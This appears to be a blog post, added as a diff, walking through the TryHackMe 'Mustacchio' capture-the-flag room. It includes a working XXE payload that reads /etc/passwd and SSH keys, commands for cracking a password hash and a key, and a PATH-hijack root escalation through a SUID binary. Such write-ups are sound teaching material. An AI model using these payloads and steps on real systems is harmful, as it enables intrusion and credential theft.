@@ -1,0 +1,194 @@
+<p>Here is the link to the CTF: <a href="https://tryhackme.com/room/mustacchio">https://tryhackme.com/room/mustacchio</a></p>
+
+<h1 id="initial-recon">Initial recon</h1>
+<p>I started a scan with <code class="highlighter-rouge">rustscan</code> and <code class="highlighter-rouge">nmap</code>.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>rustscan -r 1-65535 -a <span class="s2">"TARGETIP"</span> -- -sV -sC -T5 -Pn --script<span class="o">=</span>vuln -oN nmap.log
+</code></pre></div>
+<p>This is a table of the exposed revices:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">Port</th>
+      <th style="text-align: center">Service</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">22</td>
+      <td style="text-align: center">OpenSSH 7.2p2 Ubuntu</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">80</td>
+      <td style="text-align: center">Apache httpd 2.4.18</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">8765</td>
+      <td style="text-align: center">nginx 1.10.3</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="apache-webserver">Apache webserver</h1>
+<p>By checking the source code of <code class="highlighter-rouge">index.html</code>, we found paths to some <code class="highlighter-rouge">js</code> and <code class="highlighter-rouge">css</code> scripts.</p>
+
+<p><img src="/assets/43defb6036184e7bab085e0e79eb656d.png" alt="2021-06-12_23-06.png" /></p>
+
+<p>I therefore checked the <code class="highlighter-rouge">/custom/js/</code> path and we find out that there’s a file called <code class="highlighter-rouge">user.bak</code></p>
+
+<p><img src="/assets/00e0beedf5884ebdbd8109af0c1eac38.png" alt="37b4374bc68bc00446003932a1720230.png" /></p>
+
+<p>I downloaded it with <code class="highlighter-rouge">wget</code> and realized that it was a SQLite database.</p>
+
+<p>For reading it properly, we would need <code class="highlighter-rouge">sqlite3</code>.</p>
+
+<p>Those are the simples steps that I used to read the file:</p>
+
+<ul>
+  <li>I opened the file by issuing <code class="highlighter-rouge">sqlit3 users.bak</code>,</li>
+  <li>Listed the tables names by using <code class="highlighter-rouge">.tables</code> command</li>
+  <li>Read the content of the whole table with a simple SQL query:</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><pre class="codehilite"><code> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span><span class="p">;</span>
+</code></pre></div>
+
+<p><img src="/assets/748860b49f7142c3a1de94d3e234774f.png" alt="0a686ca233e6dcc9bb99a7daf06d871b.png" /></p>
+
+<p>And indeed, we have some credentials. We just have to crack the hash.</p>
+
+<p>I used <a href="https://github.com/jackrendor/jhf">jhf</a> to quickly identify the hashed password.</p>
+<div class="highlighter-rouge"><pre class="codehilite"><code>jhf "0a686ca233e6dcc9bb99a7daf06d871b"
+</code></pre></div>
+<p><img src="/assets/ab1abe7e90354a8792eff447c73e1ddb.png" alt="7bdcbbe932b7024bf30f53c1106049db.png" /></p>
+
+<p>Now we got the credentials for the user <code class="highlighter-rouge">admin</code>.</p>
+
+<h1 id="nginx-webserver">nginx webserver</h1>
+
+<p>Accessing the nginx service, we get access to a login page.
+<img src="/assets/7bd8bf12f4ab4bcd9563a43826363ca3.png" alt="e40bcb1b7b6fd004978e19c8540785ae.png" /></p>
+
+<p>I immediately used the credentials that I found about the <code class="highlighter-rouge">admin</code> user and I successfully logged in.</p>
+
+<p><img src="/assets/80eaac5e808949ffbe42f7d4b40f5249.png" alt="03d3d76e6321f11c16dbdf51e1be1353.png" /></p>
+
+<p>I started to analyze the html code and the <code class="highlighter-rouge">Submit</code> button calls a function called <code class="highlighter-rouge">checktarea</code>. Therefore I tried to look for references to that funciton and this is what I found:</p>
+<div class="language-js highlighter-rouge"><pre class="codehilite"><code><span class="c1">//document.cookie = "Example=/auth/dontforget.bak"; </span>
+<span class="kd">function</span> <span class="nx">checktarea</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">let</span> <span class="nx">tbox</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"box"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">tbox</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">tbox</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">alert</span><span class="p">(</span><span class="s2">"Insert XML Code!"</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>The alert that displayes <code class="highlighter-rouge">Insert XML Code!</code> made my think a lot.
+All I had to do is just understand what tags is it looking for when I press the submit button.</p>
+
+<p>I blidly typed my name in the text box and clicked <code class="highlighter-rouge">Submit</code>.
+<img src="/assets/e202a99dcfcd40e889689e312569f94b.png" alt="866a2469ae203a90cb90f1fcbf3f8983.png" /></p>
+
+<p>3 new information appears right below the submit button.</p>
+<ul>
+  <li>name</li>
+  <li>author</li>
+  <li>comment</li>
+</ul>
+
+<p>I then understood that those 3 are the tags that the webpage is looking for, so what I did next was to craft my payload to confirm that it’s vulnerable to <code class="highlighter-rouge">XXE</code>.</p>
+
+<pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE jack [&lt;!ENTITY rickroll SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;jackrendor&gt;
+    &lt;name&gt;&amp;rickroll;&lt;/name&gt;
+&lt;/jackrendor&gt;
+</code></pre>
+
+<p>Important note here:</p>
+<ul>
+  <li>
+    <p><code class="highlighter-rouge">[&lt;!ENTITY rickroll SYSTEM "file:///etc/passwd"&gt; ]</code> triest to execute the command between the quotation mark and puts the result in the <code class="highlighter-rouge">rickroll</code> variable.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">&lt;name&gt;&amp;rickroll;&lt;/name&gt;</code> takes the value of the variable <code class="highlighter-rouge">rickroll</code> and it “assign” it to the tag “name” that later will be displayed to us.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/fec35fc801af427489bb02302cd5b391.png" alt="b5ae2fa7eb623d49495a476368579b27.png" /></p>
+
+<p>Indeed, it worked.
+I was able to successfully read arbitrary files from the server.</p>
+
+<p>Reading the <code class="highlighter-rouge">passwd</code> file, I noticed that there are some “unusual users”. I tried to get the <code class="highlighter-rouge">id_rsa</code> key of every user until I tried to get <code class="highlighter-rouge">Barry</code>’s one. And I succeded. The only issue is that it’s ecrypted.</p>
+
+<p><img src="/assets/e983c233a14b405eb26c97826f348a1b.png" alt="0e3000bc277d1540fb3fe8f2249d210e.png" /></p>
+
+<p>I saved the content of the file locally as <code class="highlighter-rouge">barry.key</code> and converted it in order to make <code class="highlighter-rouge">john</code> able to crack it.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>chmod 600 barry.key
+ssh2john.py barry.key &gt; crackme.txt
+john -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt crackme.txt
+</code></pre></div>
+
+<p><img src="/assets/2cfa0937cfec4012aaea7f757f3de01a.png" alt="a0f56854b5a2fad4e837bbe684d2ed82.png" /></p>
+
+<p>Now we just have to confirm the credentials:</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh -i barry.key barry@TARGET_IP
+</code></pre></div>
+<p>and insert the password of the cracked key when asked.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>I instanlty check for potential files with SUID on by running the following command:</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>find / -type f -perm /4000 2&gt;/dev/null
+</code></pre></div>
+<p>This gave me a list of files that can I can pontentially run as other users.
+<img src="/assets/4fd91247f91047c0ae6b6ab2032bf48a.png" alt="303bf3ae8d90d1ac822344bdc0a0d10c.png" /></p>
+
+<p><code class="highlighter-rouge">live_log</code> looked interesting and I tried to run it by specifying the full path of the binary.</p>
+
+<p><img src="/assets/202167d0051b44099268193e64cbac80.png" alt="e82554aca3b779eb7131b2937a59284c.png" /></p>
+
+<p>This kind of output made me think about some sort of binary that calls a linux command to read the nginx logs. I checked first who was the owner of the file.</p>
+
+<p><img src="/assets/83bba35bb5354d308e0e03a998327fb3.png" alt="ecd0bd63075811e740c8684538608115.png" /></p>
+
+<p>So I can run that executable as root.</p>
+
+<p>After that, I checked what the file was doing by just filtering for all the printable characters with <code class="highlighter-rouge">strings</code>.</p>
+
+<p><img src="/assets/f4a7fb328e8b4810b566893651634e17.png" alt="68a16d3ecd431e62d9826b286fdf78f9.png" /></p>
+
+<p>And I was not disappointed at all.</p>
+
+<p>Now, since in the binary is not specifying the full path of the binary, we can abuse about the <code class="highlighter-rouge">PATH</code> enviorement variable to trick the executable into executing our custom <code class="highlighter-rouge">tail</code> executable.</p>
+
+<p>I made things easy for me and I just created a script inside <code class="highlighter-rouge">barry</code>’s home called <code class="highlighter-rouge">tail</code>, put the following code in it:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/bin/bash</span>
+/bin/bash -p
+</code></pre></div>
+
+<blockquote>
+  <p>Note: the <code class="highlighter-rouge">-p</code> flag is needed so we will be able to impersonificate correctly the owner of the vulnerable exetuable. For more information, check <a href="https://stackoverflow.com/a/32456814">this</a> answer on stackoverflow</p>
+</blockquote>
+
+<p>make it executable:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>chmod +x tail
+</code></pre></div>
+
+<p>and exporting the home folder of <code class="highlighter-rouge">barry</code> as the first path to check when looking for binaries:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
+</code></pre></div>
+
+<p>and execute again the binary</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>/home/joe/live_log
+</code></pre></div>
+
+<p><img src="/assets/18edd64c218d4cb6bd224b1cd3c49651.png" alt="cf115accf3bc47c2eaa01e08bbabf577.png" /></p>
+
+<p>And we’re root :)</p>
